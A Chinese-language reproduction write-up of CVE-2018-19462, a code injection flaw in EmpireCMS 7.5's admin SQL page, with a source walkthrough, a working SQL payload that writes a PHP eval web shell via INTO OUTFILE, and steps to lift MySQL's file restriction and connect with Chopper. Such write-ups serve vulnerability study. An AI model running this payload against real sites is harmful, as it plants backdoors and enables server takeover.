<html><head><meta charset="utf-8" /><style>.pydocx-caps {text-transform:uppercase}.pydocx-center {text-align:center}.pydocx-comment {color:blue}.pydocx-delete {color:red;text-decoration:line-through}.pydocx-hidden {visibility:hidden}.pydocx-insert {color:green}.pydocx-left {text-align:left}.pydocx-list-style-type-cardinalText {list-style-type:decimal}.pydocx-list-style-type-decimal {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedCircle {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedFullstop {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedParen {list-style-type:decimal}.pydocx-list-style-type-decimalZero {list-style-type:decimal-leading-zero}.pydocx-list-style-type-lowerLetter {list-style-type:lower-alpha}.pydocx-list-style-type-lowerRoman {list-style-type:lower-roman}.pydocx-list-style-type-none {list-style-type:none}.pydocx-list-style-type-ordinalText {list-style-type:decimal}.pydocx-list-style-type-upperLetter {list-style-type:upper-alpha}.pydocx-list-style-type-upperRoman {list-style-type:upper-roman}.pydocx-right {text-align:right}.pydocx-small-caps {font-variant:small-caps}.pydocx-strike {text-decoration:line-through}.pydocx-tab {display:inline-block;width:4em}.pydocx-underline {text-decoration:underline}body {margin:0px auto}</style></head><body><h1>（CVE-2018-19462）EmpireCMS 7.5 admindbDoSql.php代码注入漏洞</h1><h2>一、漏洞简介</h2><p>EmpireCMS7.5及之前版本中的admindbDoSql.php文件存在代码注入漏洞。该漏洞源于外部输入数据构造代码段的过程中,网路系统或产品未正确过滤其中的特殊元素。攻击者可利用该漏洞生成非法的代码段,修改网络系统或组件的预期的执行控制流。</p><h2>二、漏洞影响</h2><p>EmpireCMS 7.5</p><h2>三、复现过程</h2><p>漏洞出现的页面如下</p><p>1.png</p><p>分析源码定位漏洞出现的位置在/e/admin/db/DoSql.php,浏览代码,对sqltext使用RepSqlTbpre函数进行处理</p><p>2.png</p><p>跟进RepSqlTbpre函数,发现仅仅对表的前缀做替换,没有做其他任何处理</p><p>3.png</p><p>继续浏览代码,发现对$query使用DoRunQuery函数进行处理</p><p>4.png</p><p>跟进DoRunQuery函数,可以看到对$sql参数只做了去除空格、以”;”分隔然后遍历,并你没有做别的限制和过滤,导致可以执行恶意的sql语句</p><p>5.png</p><p>登录后台,点击如下,输入一段写shell的payload,payload内容如下:</p><p>select '&lt;?php @eval($_POST[1])?&gt;' into outfile 'C:/phpStudy/WWW/empirecms/shell.php'</p><p>6.png</p><p>点击”执行SQL”,提示错误,是由于mysql安全限制的原因</p><p>7.png</p><p>修改mysql的配置文件, 在[mysqld] 下添加条目: secure_file_priv =,保存之后,然后重启mysql</p><p>8.png</p><p>再次执行SQL语句,可以看到成功执行SQL语句</p><p>9.png</p><p>查看是否成功上传shell</p><p>10.png</p><p>菜刀连接,成功getshell</p><p>11.png</p><h2>参考链接</h2><p>https://www.shuzhiduo.com/A/E35pxYYE5v/</p></body></html>